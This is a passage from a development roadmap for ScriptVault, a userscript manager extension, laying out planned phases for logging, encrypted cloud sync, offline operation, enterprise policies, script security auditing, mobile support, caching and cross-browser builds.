- Intercept `console.log` / `console.warn` / `console.error` at injection time: `window.__scriptVaultConsole__ = { script: <id>, logs: [...] }`
- Extension background collects logs and stores in IndexedDB `script_logs` table (time-series, auto-cleanup after 30 days)
- Dashboard: "Console" tab filters by script, shows timestamp + level + message [source 103]

### 20.4 Script Error Categorization
- Distinguish between: script syntax errors (parse-time), runtime errors (`window.onerror`), promise rejections (`unhandledrejection`), and timeout/timeout errors
- Tag errors with context: `@match` URL, execution order relative to page load, document.readyState
- Dashboard: "Errors" tab shows histogram of errors per script, latest 100 errors with stack traces [source 104]

### 20.5 Network Request Tracing (Privacy-Safe)
- Log per-script outbound requests using `GM_fetch`/`GM_xmlhttpRequest` interception
- Store: method, URL (truncated at query string), status code, latency, initiating script ID
- Do NOT log response bodies or request headers (privacy)
- Dashboard: "Network" tab shows request waterfall per script [source 105]

### 20.6 Permission Denial Logging
- When a script tries to use a GM API it doesn't have in its @grant list, log the denial + stack trace
- Example: script calls `GM_setValue` without `@grant GM_setValue`
- Dashboard: "Permissions" tab shows permission denials, suggests @grant additions

**Exit criteria:** Execution time data logged for 5+ script operations; source maps render in DevTools; per-script console appears in dashboard with filters; error categorization tested; network tracing logs 10+ request types; permission denials logged and suggested as @grant additions.

---

## Phase 21 — Extended Sync Backends & Privacy Hardening

**Goal:** Support additional cloud backends beyond Dropbox/GDrive/OneDrive and improve privacy of synchronized data.

### 21.1 GitHub Gist Sync (Two-Way)
- GitHub Gist as a sync backend for users with a GitHub PAT
- One Gist per library: plaintext JSON with script metadata (not code bodies due to Gist size limits)
- For code bodies: optional S3-compatible backend (see 21.2) or local-only with manual export
- Gist API: create/update gist via `PUT /gists/<id>` with `{files: {"scripts.json": {content: "..."}}}` [source 106]
- Revision history: read Gist revision list to show sync history in Settings

### 21.2 S3-Compatible Sync (Cloudflare R2, Backblaze B2, MinIO)
- S3 API support via presigned URLs (avoid embedding credentials in extension)
- Server-side signing: extension sends request to `https://example.com/s3-presign?bucket=...&key=...` → receives presigned URL → extension uploads directly to S3 [source 107]
- For script bodies + large backups: S3 is ideal (no size limits, cheap, supports streaming uploads)
- Authentication: users provide bucket name + presigned-URL endpoint, no AWS credentials in extension memory

### 21.3 Nextcloud / Self-Hosted WebDAV + CalDAV Fallback
- Extend existing WebDAV (Phase 8) to detect Nextcloud and offer native Nextcloud Files API as option
- CalDAV as a fallback sync transport: Nextcloud Contacts can be used to store versioned backup metadata
- Auto-discovery: when user enters Nextcloud URL, detect instance and offer sync options

### 21.4 Client-Side Encryption for Cloud Backup
- Optional password-protected backup using Web Crypto API: `AES-256-GCM` + `PBKDF2` key derivation
- User enters passphrase → `PBKDF2(passphrase, salt, 100000 iterations)` → derives encryption key
- Backup encrypts before upload; cloud stores opaque blob (cannot be indexed/searched by provider)
- UI in Settings: "Encrypt cloud backup with password", generate random salt, show salt QR for backup [source 108]

### 21.5 Privacy Hardening: Referrer Stripping in GM_xhr
- Add UI toggle: "Strip referrer from GM_xmlhttpRequest" — when enabled, adds `"Referer": ""` header to all script XHR
- Logs all referrer-stripped requests in the execution log for transparency
- Document that `@connect` enforcement (Phase 11.7) + referrer stripping + credential modes combine for privacy [source 109]

### 21.6 Incognito Mode Storage Isolation
- When running in incognito window: isolate GM_setValue storage per-window instance
- Do NOT persist incognito storage to persistent IndexedDB; use `chrome.storage.session` only (cleared on window close)
- UI: show "Incognito mode" badge in dashboard when opened in incognito context

**Exit criteria:** GitHub Gist sync connects with PAT and syncs metadata; S3 presigned-URL flow works end-to-end; WebDAV detects Nextcloud; password-protected backup encrypts/decrypts with PBKDF2; referrer-stripping toggle appears in Settings; incognito storage uses chrome.storage.session; no data persists after incognito window closes.

---

## Phase 22 — Community Standards & Long-Tail Features

**Goal:** Implement emerging community standards and address high-value edge cases.

### 22.1 GREASE Metadata Spec Alignment
- GREASE (Greaselike Extension Assembly Standard) is being standardized by the userscript community
- Ensure ScriptVault's @metadata header parsing aligns with GREASE; add missing directives if spec changes
- Current scopes: @namespace, @name, @version, @description, @author, @license, @homepageURL, @documentationURL, @updateURL, @downloadURL, @support URL, @icon, @iconURL, @defaultIcon, @run-at, @include, @exclude, @match, @require, @resource, @grant, @noframes, @inject-into, @connect
- Add future GREASE additions as Phase 22 sub-versions [source 110]

### 22.2 URLPattern API for @match Rewrite — PROMOTED to Next (Round 12)
- Chrome 95+: `new URLPattern(pattern)` provides a standard way to parse URL patterns
- If Greasemonkey @match syntax aligns with URLPattern, rewrite Phase 4's URL matcher to use URLPattern API
- Fallback: keep custom regex engine for non-URLPattern platforms (Firefox, older Chrome)
- Benefit: align with web standards; potential to share test cases with other browsers [source 111]
- **2026-05-17 status (Round 12):** WHATWG URLPattern spec dated March 2026 reached **Baseline Newly Available** ([web.dev/baseline-urlpattern](https://web.dev/blog/baseline-urlpattern)). Promoted from Later → **Next**. The spec is now stable enough that Phase 4's matcher can be expressed as a thin wrapper over `URLPattern` for the modern path, keeping the regex engine only for `@include` regex patterns and edge cases the standard doesn't cover. Tracked in Phase 39.44.

### 22.3 `@require-local` Directive (Script Dependencies)
- Allow `@require-local id:scriptId` to reference another installed script by ID as a dependency
- Extension will fetch the dependency script code at injection time and prepend it before the main script
- Enables script authors to build modular script libraries without external @require URLs
- Version mismatch warning: if required script is disabled or missing, show warning in dashboard [source 112]

### 22.4 `@sandbox` Content Security Policy Bypass Detection
- When a script tries to use `@sandbox` (ScriptCat extension), ScriptVault cannot honor it (no equivalent CSP bypass in Chrome MV3)
- Add a warning in the dashboard: "Script requested sandbox mode which isn't available; some content injection patterns may fail"
- Document limitation in README [source 113]

### 22.5 Import Maps Support for ESM Scripts
- Chrome 89+: pages can define import maps via `<script type="importmap">`
- If an injected script is compiled to ESM (Phase 15.6) and the page has import maps, the script can leverage them
- Behavior: do NOT override page import maps; inject into the page's module namespace
- Document best practices: when is it safe to use page import maps vs bundling everything [source 114]

### 22.6 File System Access API as Optional GM_* Bridge
- `showOpenFilePicker()` / `showSaveFilePicker()` require user gesture and work from content scripts
- Add optional `GM_openFile()` / `GM_saveFile()` APIs that wrap File System Access (Chrome 86+)
- Gate behind `@grant GM_openFile` + requires user gesture check before calling
- Use case: scripts that need to read/write local files (e.g., config persistence, local data export) [source 115]

### 22.7 Broken Script Detection & Proactive Maintenance
- Phase 18.9 (broken script detector) flags scripts idle 30+ days with errors
- Add "Maintenance Mode": dashboard suggests scripts to migrate/update, shows deprecation warnings from script authors
- Check `@supportURL` for issues/discussions about script maintenance status

### 22.8 Security Disclosure Support for Script Authors
- If a script is flagged for security issues (Phase 5/17 audit), add a UI element: "Report security issue"
- Guide users to email script author via @supportURL or @author email
- Optionally: integrate with GreasyFork security report mechanism (if available)

**Exit criteria:** GREASE metadata directives validated; URLPattern API tested on sample @match patterns; `@require-local` dependency injection works; @sandbox detection shows warning; ESM script execution works with page import maps; File System Access API gate behind @grant; broken script detection shows maintenance suggestions; security report flow documented.

---

## Phase 23 — Offline-First Architecture & Resilient Sync

**Goal:** Enable ScriptVault to function when offline and provide conflict-free sync when reconnecting.

### 23.1 Local-First Operation After Initial Setup
- Once a script has been synced once, cache it locally in IndexedDB with full code + metadata
- Service worker serves cached scripts even when offline; inject without fetching from cloud
- Display "offline mode" banner in dashboard; show last-sync timestamp
- Script updates are queued locally; apply on reconnection

### 23.2 Async Sync Queue & Reconnection Logic
- When network returns (SW detects `navigator.onLine`), drain the queue:
  1. Check for updates to each script (using @updateURL if present)
  2. Backup changed scripts to cloud
  3. Pull any remote changes since last sync
  4. Resolve conflicts using last-write-wins + tombstone deletion markers
- Use chrome.alarms to poll `navigator.onLine` every 30 seconds when offline [source 116]

### 23.3 Conflict-Free Sync with Tombstones & Vector Clocks
- Each script carries a vector clock: `{ device_id: timestamp }` tracking which device last modified it
- When syncing, if both local and remote have edits: merge metadata, keep the newer version
- Tombstones mark deleted scripts with `deleted: true, deleted_at: timestamp` — never physically remove, just mark
- UI: "Conflicting versions" button if local ≠ remote code on same @version; user chooses keep/discard [source 117]

### 23.4 OPFS-Based Offline Cache (Chrome 86+)
- Store script bodies in OPFS (Phase 18.2) for fast, zero-quota-driven reads
- IndexedDB holds metadata only; IDB reads are faster on reconnection than re-reading all bodies from OPFS
- Fallback to IDB if OPFS unavailable

### 23.5 Sync Resilience: Exponential Backoff & Error Recovery
- When cloud sync fails: retry with exponential backoff (1s, 2s, 4s, 8s, 30s max)
- If sync fails 3+ times: show "Sync failed, will retry on reconnection" + keep using local cache
- Error log: timestamp, reason (timeout, 403, network, etc.), next-retry time [source 118]

**Exit criteria:** Scripts load offline with cached code; reconnection syncs queued updates; tombstones prevent resurrection of deleted scripts; vector clocks resolve conflicts; offline banner shows; sync failure backoff tested to 3+ retries.

---

## Phase 24 — Script Discovery, Recommendation & Metrics

**Goal:** Help users discover scripts beyond GreasyFork and provide in-manager browsing + popularity signals.

### 24.1 In-Dashboard Script Browser (GreasyFork + OpenUserJS)
- Add "Discover" tab in dashboard: search + browse top scripts from GreasyFork and OpenUserJS
- Fetch top-50 scripts endpoint if available; fall back to scraping + caching results
- Display script name, author, install count (if exposed), last-updated date, short description
- One-click install flow: user selects script → ScriptVault adds to library [source 119]

### 24.2 Popularity Signals & Health Indicators
- Display per-script: last updated date, install count (from GreasyFork), rating, comment count
- Calculate health score: (recency + install_growth + rating) — flag old/abandoned scripts
- Show "⚠️ Abandoned" badge for scripts not updated in 180+ days [source 120]

### 24.3 Related Scripts Recommendations
- Build a graph of script metadata: scripts with same @match pattern, similar @name keywords
- Dashboard: "Related scripts" sidebar suggesting similar scripts by @match or category
- Example: user installs a Netflix enhancement script → recommend similar video-site scripts

### 24.4 Script Dependency Suggestions
- When a script uses @require URLs, check if those dependencies are available on GreasyFork/OpenUserJS
- Suggest one-click install for upstream dependencies if missing from user's library [source 121]

### 24.5 Custom Script Collections (User-Created)
- Allow users to create collections: group scripts by category (productivity, entertainment, social media, etc.)
- Share collection as JSON export; others can import via URL or upload
- Example: "Twitter Enhancement Bundle" (10 scripts) shareable via GitHub Gist [source 122]

### 24.6 Trending & Leaderboard Dashboard
- "Trending this week": scripts with most new installs (tracked locally, aggregate anonymous stats)
- "Most active" developers: authors with most updated/released scripts
- Optional: trending dashboard without personal user identification [source 123]

**Exit criteria:** "Discover" tab appears in dashboard; top 50 scripts render with health badges; "Related scripts" sidebar functional; collections can be created/shared; trending leaderboard shows in dashboard.

---

## Phase 25 — Enterprise Deployment & Performance Profiling

**Goal:** Enable organization-wide script distribution and provide deep performance insights for script authors.

### 25.1 Chrome Admin Console Integration (ExtensionSettings Policy)
- Generate policy JSON for domain admins to deploy ScriptVault via Chrome Admin Console
- Provide admin guide: setup ExtensionSettings policy + force-install ScriptVault to all users
- Include sample policy JSON with example allowed/blocked hosts, @match patterns [source 124]

### 25.2 Internal Script Repository (Admin-Controlled)
- Admins can configure ScriptVault to fetch scripts from internal server (not just GreasyFork)
- Endpoint: `https://internal.company.com/api/scripts` returns JSON list of scripts + metadata
- ScriptVault discovers, validates, and installs scripts from allowlist
- Enables organization to mandate scripts (security monitoring, corporate policy enforcement) [source 125]

### 25.3 Script Allowlist / Denylist (Admin Policies)
- Admin creates whitelist of permitted script IDs / @match patterns
- Denylist of forbidden scripts (e.g., productivity killers, gambling sites)
- ScriptVault validates at install time + runtime: warns if script violates policy, offers uninstall [source 126]

### 25.4 Audit Log Export (SOC2 / FedRAMP)
- Dashboard: "Audit" tab shows all script installations, executions, errors with timestamp + user context
- Export as CSV or JSON for SIEM ingestion
- Fields: script name, script ID, @match, action (install/enable/error), timestamp, error details [source 127]

### 25.5 Per-Script Performance Profiling
- Extend Phase 20 observability: measure DOM reflows, paint time, memory allocation per script
- Use `PerformanceObserver` to capture Long Tasks induced by scripts (Chrome 123+ LoAF API) [source 128]
- Dashboard: "Performance" tab ranks scripts by CPU/memory impact; flag high-impact scripts

### 25.6 Execution Timeline Visualization
- Interactive waterfall chart showing script load order, timing, and dependencies
- Highlight slow scripts, blocking operations, and resource conflicts
- Export as HTML report for script authors

**Exit criteria:** Admin policy JSON generated; internal script repository endpoint configured; allowlist/denylist enforced at runtime; audit log exports CSV; performance profiling captures LoAF Long Tasks; timeline visualization renders for 10+ scripts.

---

## Phase 26 — WebAssembly Support & Advanced Content Filtering

**Goal:** Enable scripts to use WASM for compute-intensive tasks and improve @match pattern matching.

### 26.1 @require-wasm Metadata Directive
- New directive: `@require-wasm https://example.com/lib.wasm`
- ScriptVault fetches .wasm file, instantiates via `WebAssembly.instantiate()`, exports to script global scope
- Script accesses via: `window.wasmLib.exportedFunc()` (auto-bound by injection engine) [source 129]

### 26.2 WASM CSP Compliance & Security
- Verify WASM file size < 10 MB (prevent bloat)
- Hash @require-wasm URLs using SRI (Phase 11.8 @require SRI extended)
- Sandbox WASM execution: errors in WASM do not crash host script
- Log WASM instantiation success/failure to execution log (Phase 20) [source 130]

### 26.3 URLPattern API Migration (Phase 22 extended)
- If @match syntax aligns with URLPattern API (Chrome 95+), rewrite URL matcher to use native API
- Benchmark: URLPattern vs custom regex on 1000+ patterns
- Performance win: likely 2–3x faster URL matching [source 131]

### 26.4 Advanced @match Boolean Logic
- Support: `@match (https://twitter.com/* OR https://x.com/*) AND NOT https://*/explore`
- Parser: tokenize @match into AST, evaluate at runtime
- UI: visual @match builder with AND/OR/NOT toggles (optional, Phase 24 script browser integration) [source 132]

### 26.5 Frame-Aware @match
- New option: `@run-in-frame main` / `@run-in-frame iframe` / `@run-in-frame all`
- Default: "main" (only main document, not nested iframes)
- Allows scripts to opt-in to running in iframes on the same domain [source 133]

### 26.6 @match Performance Regression Testing
- Benchmarking suite: test URL matching against 1000+ URLs to ensure no slowdown with advanced @match features
- CI/CD: every build measures URL matcher latency; fail if > 10% regression [source 134]

**Exit criteria:** @require-wasm directive works; WASM module instantiates and exports functions; URLPattern migration tested; advanced @match boolean logic parses and evaluates; frame-aware @run-in-frame flags are respected; benchmark suite passes with <10% regression.

---

## Phase 27 — Script Author Tooling Ecosystem

**Goal:** Provide developers with best-in-class build, testing, and linting tools for userscript development.

### 27.1 @scriptvault/eslint-plugin
- ESLint plugin with rules for:
  - Unused @grant declarations (warns on `GM_` API references without @grant)
  - Dangling @require URLs (fetch + validate all @require endpoints at lint time)
  - @match/@include complexity audit (flag regex performance issues)
  - Comment scanning for hardcoded secrets (API keys, passwords)
  - Deprecation warnings for old GM_* APIs (warn on Phase 11.6-11.11 deprecated APIs)
- CLI: `eslint --plugin=@scriptvault/eslint-plugin myScript.user.js` [source 135]

### 27.2 @scriptvault/test-runner (Playwright-based)
- Wrapper around Playwright: inject userscripts into page + run test cases
- Mock GM_* API calls (GM_setValue/getValue/fetch)
- JSDOM + custom @match simulation for headless testing
- Support for: snapshot tests, DOM mutation assertions, network mocking [source 136]

### 27.3 @scriptvault/doc-gen
- Generate markdown README from userscript metadata header
- Extract: @name, @description, @author, @supportURL, @resource, @license, version history
- Build configuration table from commented @option directives
- Auto-generate install links to GreasyFork/OpenUserJS/Sleazy Fork [source 137]

### 27.4 Enhanced vite-plugin-monkey Templates
- Partner with vite-plugin-monkey maintainer to ship ScriptVault-curated templates
- Pre-baked templates with:
  - Error boundary wrapper (Phase 20 error categorization)
  - Performance instrumentation (Phase 25 profiling)
  - Built-in logging to ScriptVault execution log
  - Security best practices (no eval, CSP compliance, @connect usage)

### 27.5 Script Header Validator & Generator UI
- Web-based tool (hosted on scriptvault.org or GitHub Pages): validate + generate script headers
- Input: name, description, @match patterns, @grant list → outputs formatted header
- Batch validation: upload ZIP of scripts, get compliance report [source 138]

### 27.6 Version Management & Changelog Auto-Generation
- CLI tool: scans git history, extracts commit messages, generates @version increment suggestions
- UI: dashboard integration to bump version + auto-generate changelog entries [source 139]

**Exit criteria:** ESLint plugin detects unused @grant in test script; Playwright test runner successfully mocks GM_setValue + runs assertions; doc-gen generates valid markdown from metadata; vite-plugin-monkey templates include error instrumentation; header validator passes 100+ test cases; version bump CLI generates changelog.

---

## Phase 28 — Community Security, Peer Review & Transparency

**Goal:** Build trust in the userscript ecosystem through security audits, peer review, and transparency.

### 28.1 Script Security Audit Framework
- ScriptVault performs static analysis on scripts:
  - Scan for eval/Function() usage (Phase 22 security detection extended)
  - Check for hardcoded credentials in comments/strings
  - Validate @require URLs against known malware domains
  - Flag dynamically generated @match patterns (code injection risk)
- Dashboard: "Security Score" badge per script (0–100) [source 140]

### 28.2 Community Peer Review System
- Users can flag scripts as reviewed; curators maintain a "peer-reviewed" list
- GitHub integration: ScriptVault publishes reviewed scripts to a GitHub repo (read-only)
- Maintenance: community votes on which scripts to audit (weighted by reputation) [source 141]

### 28.3 Script Malware Detection & Quarantine
- Monitor installed scripts for runtime suspicious behavior:
  - Sudden network spikes (exfiltration patterns)
  - Keylogging patterns (excessive keyboard event handlers)
  - Cryptomining (high CPU usage with no user interaction)
- Optional: quarantine suspicious scripts, alert user with evidence [source 142]

### 28.4 Vulnerability Database & CVE Tracking
- Maintain a CSV/JSON database of known-vulnerable script versions
- Link to GitHub issues / CVEs if available
- Dashboard alert: "Script XYZ v1.2.0 has known vulnerability #123, update available"
- Automated check: on each install/update, validate against vulnerability DB [source 143]

### 28.5 Transparency Report (Annual)
- Publish aggregate stats: "X scripts audited, Y security issues found and resolved, Z DMCA/takedown requests"
- Privacy: no user identification, only anonymized aggregates
- Format: PDF + GitHub public repo for community discussion [source 144]

### 28.6 Author Reputation & Trust Signals
- Track author history: number of scripts published, update frequency, community ratings
- Display "trusted author" badge for authors with 50+ installations + 4.5+ avg rating
- Support: show author response time to security reports + bug fixes [source 145]

**Exit criteria:** Static analyzer detects eval/Function() in test script; peer review UI allows flagging + voting; runtime malware detector simulates cryptomining pattern; vulnerability DB query returns known-vulnerable version; transparency report generated in PDF/JSON; trusted author badge shows for authors with 50+ installs + 4.5+ rating.

---

## Phase 29 — Mobile PWA & Cross-Device Sync

**Goal:** Make ScriptVault a first-class PWA with offline support on iOS/Android and enable seamless sync across devices.

### 29.1 PWA Manifest & Mobile Installability
- Generate `manifest.json` with required fields: `name`, `short_name`, `icons` (192px, 512px), `start_url`, `display` (standalone)
- Add category icons for script types (productivity, entertainment, social media, utilities)
- Support `beforeinstallprompt` event to trigger install prompt after 30s or user engagement
- Test on Android Chrome (full support), Safari iOS 16.4+ (limited), Firefox Android
- Support: Home screen install on Android, Add to Home Screen on iOS Safari [source 146]

### 29.2 File System Access on Mobile with Fallbacks
- **Desktop (Chrome 86+):** Use `showOpenFilePicker()` for native file picker
- **Mobile Android:** Fallback to `<input type="file" accept=".js" multiple>` for script import
- **iOS PWA:** No File System Access API; use iCloud Drive integration (Phase 29.3) or localStorage migration
- Service Worker caches imported scripts for offline access
- Handle partial support gracefully: detect capability, warn user on unsupported platforms [source 147]

### 29.3 iCloud Drive & CloudKit Integration for iOS
- Implement CloudKit `CKDatabase` for iOS PWA script storage
- Subscribe to `CKQuerySubscription` for push notifications on changes
- Fallback: Manual iCloud Drive sync via file picker (iOS 14+)
- End-to-end encryption option using CloudKit's built-in support
- Dashboard: iCloud sync toggle + status indicator [source 148]

### 29.4 Yjs-Based Conflict-Free Sync Architecture
- Adopt **Yjs** (900k+ weekly npm downloads, used by Evernote, AFFiNE, Cargo) for CRDT-powered sync
- Replace Phase 23's vector-clock system with Yjs `Y.Map` (metadata) + `Y.Text` (script code)
- Auto-merge changes without user intervention; mathematically guaranteed conflict-free
- Support offline editing on all devices → auto-sync on reconnection
- Integration: Works with Monaco editor (already used in Phase 15) [source 149]

### 29.5 Selective Device Sync with Tagging
- Users tag scripts: `#mobile`, `#critical`, `#utility`, `#desktop-only`
- Configuration: per-device sync policy (phone: mobile+critical; tablet: mobile+utility; desktop: all)
- Sync only tagged scripts to mobile to conserve bandwidth + storage
- Dashboard: Tagging UI + per-device sync status [source 150]

### 29.6 RemoteStorage Protocol for Decentralized Sync
- Implement **RemoteStorage** (2,398 stars) for optional decentralized sync
- Users connect via OAuth + WebDAV endpoint to personal server
- Alternative to cloud sync (Phase 21): scripts stored on user's own infrastructure
- Support Nextcloud, OwnCloud, self-hosted WebDAV servers
- Dashboard: RemoteStorage account linking + status [source 151]

**Exit criteria:** PWA installs on Android Chrome; File System Access fallbacks to file picker on iOS; Yjs sync merges changes without conflicts; iCloud Drive integration syncs scripts to iPhone; selective tagging filters 50+ scripts to mobile-only set; RemoteStorage connects to Nextcloud instance.

---

## Phase 30 — Advanced Caching & Performance Optimization

**Goal:** Achieve 5–10x performance improvement for large script libraries through cache coherence, tree-shaking, and emerging optimization techniques.

### 30.1 HTTP Cache Headers & Versioning Strategy
- Implement content-hash versioning for immutable resources: `script.a1b2c3.js` with 1-year cache (`Cache-Control: max-age=31536000`)
- Use `Cache-Control: no-cache` + ETag for versioned URLs and API responses
- Service Worker: send `If-None-Match` on revalidation to get `304 Not Modified` without re-downloading
- Reduces bandwidth for stable script versions by 70% on slow networks [source 152]

### 30.2 Stale-While-Revalidate (SWR) Pattern for API Responses
- Apply `Cache-Control: max-age=60, stale-while-revalidate=300` to GreasyFork API calls
- Users get cached script list immediately; background fetch updates the cache asynchronously
- SWR cuts GreasyFork API thrashing by 70% on script list loads
- Dashboard: API call latency reduces from 500ms+ to 300-400ms on 3G networks [source 153]

### 30.3 Cache Coherence & Dependency Caching
- Build script dependency graph: if Script A `@require`s B, track both in cache
- When B updates, invalidate A's compiled state but preserve B's cached code
- Avoid re-bundling A if only B changed — significant perf win for large ecosystems
- Use Google `diff-match-patch` for delta-based version storage (100KB script × 50 versions = 500KB instead of 5MB)
- Micro-cache pattern: cache GreasyFork responses in `chrome.storage.session` for 1min [source 154]

### 30.4 esbuild Code-Splitting & Lazy-Loading
- Split dashboard bundle by feature: `dashboard-scripts.js`, `dashboard-settings.js`, `dashboard-editor.js`
- Baseline: 450KB → load-time: 150KB + 100KB + 180KB (lazy), saving 200KB on initial load
- Enable esbuild `--incremental` for watch-mode rebuilds: 300ms → 80ms
- Performance target: dashboard load 2.5s → 1.2s initial; watch rebuild 300ms → 80ms [source 155]

### 30.5 Monorepo Architecture for Author Tools (Phase 27 scaling)
- Use Turborepo or Nx for monorepo structure: `@scriptvault/core`, `@scriptvault/eslint-plugin`, `@scriptvault/test-runner`
- Isolate tooling from core extension: authors can update tools without triggering extension rebuild
- Tree-shaking in esbuild: ensure ESM imports only; no CommonJS `require()` in conditional imports
- Phase 27 tooling loads on-demand; core extension stays lean [source 156]

### 30.6 Emerging Optimization Techniques (Chrome 135+)
- **Priority Hints** (`importance="high"` on critical resources): prioritize script list fetch
- **Resource Hints** (`dns-prefetch`, `preconnect` for GreasyFork API): reduce DNS resolution overhead
- **View Transitions API** (Phase 13.2 mentions `sidePanel.getLayout()`): smooth panel transitions when switching dashboard tabs
- **Scheduler.yield()** (Chrome 124+): allow main thread breathing room during large batch operations
- **Preload directives**: preload critical scripts for users with top-10 frequently-used scripts [source 157]

**Exit criteria:** Content-hashed URLs serve 1-year cache; ETag revalidation returns 304; SWR reduces API calls by 70%; dependency graph prevents redundant bundling; dashboard load time measured at 1.2s; monorepo structure splits tooling; Priority Hints registered for critical resources.

---

## Phase 31 — Community Platform & Governance

**Goal:** Build trust and engagement through community-driven reputation, peer governance, and transparent communication.

### 31.1 Discourse Community Forum Setup
- Deploy self-hosted or managed Discourse instance for ScriptVault community
- Categories: Announcements, Feature Requests, Script Showcase, Script Help, Development
- Integration: Discord bot mirrors announcements; RSS feed for GitHub releases
- Moderation: Automated spam filters; reputation badges for trusted contributors [source 158]

### 31.2 Community Reputation & Recognition System
- **Install count tracking:** Aggregate anonymous install counts for each script (no user IDs)
- **Author badges:** "Trusted Author" (50+ installs + 4.5+ avg rating), "Prolific" (100+ scripts), "Helpful" (responsive to issues)
- **Peer voting:** Community votes on script quality; voting signal improves script discovery ranking
- **Integration:** Display on Greasy Fork, in-manager UI, and ScriptVault leaderboard dashboard [source 159]

### 31.3 GitHub Discussions Integration
- Link official GitHub Discussions for each phase/feature area
- GitHub Discussions handle: Feature proposals, user feedback, peer support
- Threads auto-link to ROADMAP phases for traceability
- Dashboard: "Community feedback" widget showing trending discussions [source 160]

### 31.4 Privacy-Preserving Aggregated Usage Insights
- Collect anonymous metrics (no user ID, no script details):
  - Script popularity trends (install deltas, error rates)
  - Feature usage patterns (which features help most users)
  - Performance signals (scripts that crash frequently)
- Use federated learning: each client trains local model → send model updates only (not raw data)
- Differential privacy: add mathematical noise to aggregate counts before publishing
- Architecture: Firefox Telemetry model (structured pings + opt-in collection) [source 161]

### 31.5 Script Author Code of Conduct & Transparency
- Define Code of Conduct: expectations for security, licensing, update frequency
- Publish violations transparently: removed scripts, security disclosures, DMCA notices (anonymized)
- Author response time SLA: commit to responding to security reports within 7 days
- Dashboard: Author profile with response time stats + script health metrics [source 162]

### 31.6 Multi-Manager Interop Liaison
- Participate in userscript standards discussions (WASM Component Model, abx-spec-behaviors)
- Publish "compatibility matrix" tracking which scripts work across TM/VM/ScriptCat/ScriptVault
- Provide migration guides for users switching between managers
- Test compatibility on each major Tampermonkey/Violentmonkey release [source 163]

**Exit criteria:** Discourse forum deployed with 3+ categories; author reputation badges display in-manager; GitHub Discussions threads linked to Phases; privacy-preserving usage metrics published monthly; author Code of Conduct adopted; interop matrix shows 80%+ of popular scripts compatible across managers.

---

## Phase 32 — Emerging Standards & Next-Gen Architectures

**Goal:** Future-proof ScriptVault by adopting emerging scripting standards and enabling next-generation portability.

### 32.1 WASM Component Model Integration (W3C) — DEPRIORITIZED (Round 12)
- ~~Research WASI Preview 2+ support in browser service workers (experimental, Chrome 146+)~~
- ~~Enable scripts to be packaged as WASM components (from TypeScript → esbuild-wasm → component binary)~~
- ~~Publish "Userscript as WASM component" pattern: script exports `run()` function via component model IDL~~
- ~~Fallback: JavaScript userscripts remain first-class; WASM is opt-in for performance-critical scripts [source 164]~~
- **2026-05-17 status (Round 12):** Per [component-model.bytecodealliance.org](https://component-model.bytecodealliance.org/), the WASM Component Model is **server-side only** in 2026 — Wasmtime/wasm-tools are the implementations; no browser host exists. Dropping from active planning until a browser-side runtime ships. Tracked in Phase 39.46 as an explicit "do not plan against this" entry to prevent the speculation from re-entering future research rounds. **WASI Preview 2 in browser SW is not on Chromium's roadmap.**

### 32.2 Cross-Platform Portability Standard (abx-spec-behaviors)
- Adopt abx-spec-behaviors schema: standardize selectors (CSS/XPath) + actions (click, fill, extract)
- Enables scripts to run unchanged in:
  - Browser managers (ScriptVault, Tampermonkey, Violentmonkey)
  - Automation tools (Playwright, Puppeteer scripts)
  - Model-backed browser integrations
  - Native automation (MacroDroid, Tasker on Android)
- Dashboard: "Export as portable script" option exports abx-spec format [source 165]

### 32.3 JavaScript Modularization via Import Maps
- Adopt TC39 `import.meta` (Stage 4 proposal) for module metadata
- Enable script library federation: Script A depends on B → managed via import maps (no bundling needed)
- @require-module directive (companion to Phase 22's @require-local): fetch modules via import maps
- Integrate vite-plugin-monkey to generate import maps from @require declarations
- Use JSPM CDN for module resolution [source 166]

### 32.4 Tampermonkey/Violentmonkey MV3 Parity Lock-In
- By 2026, MV3 is complete across all managers; Phase 32 solidifies parity on edge cases
- Test and document remaining MV3 limitations: no MV2 polyfills needed
- Publish "MV3 Feature Parity Chart" updated quarterly; track ScriptCat, Violentmonkey, Tampermonkey
- Archive MV2 reference docs for legacy support (Firefox, older Safari) [source 167]

### 32.5 Local-Model Script Analysis & Debugging (Ethical)
- **Read-only local-model features** (no code generation per anti-bloat):
  - "Explain this error" (Phase 15 integration): invoke a local model runner or batch API
  - "Show similar patterns" from stdlib or @require libraries
  - "Check security issues": auto-review for eval(), unescaped HTML, suspicious @connect patterns
- Backend: local model runner (free, ~4GB VRAM) OR hosted batch API ($0.20/day for 1,000 queries)
- Never suggest auto-fixes; always user-reviewed before apply [source 168]

### 32.6 Wasmtime as Optional Script Runtime
- Investigate Wasmtime (BytecodeAlliance) as an alternative script runtime for:
  - Long-running background tasks that don't need DOM
  - Heavy computation (crypto, image processing) with security sandbox
  - Cross-platform portability (WASM → native)
- Phase 32 is research + feasibility study; Phase 33+ for production integration if viable
- Publish findings: "When to use WASM vs. JavaScript for userscripts" [source 169]

**Exit criteria:** Sample WASM component script compiles and runs in service worker; abx-spec portability format specified and documented; import-maps-based @require-module works for 10+ test scripts; MV3 parity chart published; local-model "explain error" feature works with a local or hosted batch endpoint; Wasmtime feasibility study completed with benchmark results.

---

## Phase 33 — Cross-Browser Support & Build Pipeline

**Goal:** Ship ScriptVault to Firefox, Edge, Brave/Vivaldi/Opera, Orion, and (long-tail) Safari without forking the codebase. Establish a build pipeline that produces per-browser artifacts from a single source.

**2026-05-17 status:** ⚠️ Operational plan scaffolded in [`docs/cross-browser-pipeline.md`](docs/cross-browser-pipeline.md): WXT migration justified vs Plasmo / manual esbuild / web-ext; 6-stage sequence (repo prep → Firefox MV3 → Edge → derivatives → Orion → Safari deferred); API-surface differences table; CI matrix changes; 6–10 week estimate for Chrome+Firefox+Edge+derivatives+Orion, +8–16 weeks for Safari behind decision gate.

### 33.1 Cross-Browser Build Pipeline (WXT)
- Migrate build from current Vite/esbuild to **WXT** (https://wxt.dev) — auto-handles MV2/MV3 conversion, browser-specific manifests, hot-reload across vendors [source 180]
- Define build targets: `chrome`, `firefox-mv3`, `edge`, `safari` (via `xcrun`)
- Per-browser manifest function: conditional `background` (event page vs service worker), permissions, `web_accessible_resources` UUID handling
- CI matrix: build all 4 targets on every PR; smoke-test each in respective browser
- Alternative considered: Plasmo Framework — WXT chosen for smaller dependency surface and explicit MV3-first stance [source 181]
- **Effort:** 2–3 weeks (prerequisite to all other 33.x subtasks)

### 33.2 Firefox MV3 Port
- Add `browser_specific_settings.gecko.id` and `gecko.strict_min_version` to manifest (Firefox 128+) [source 182]
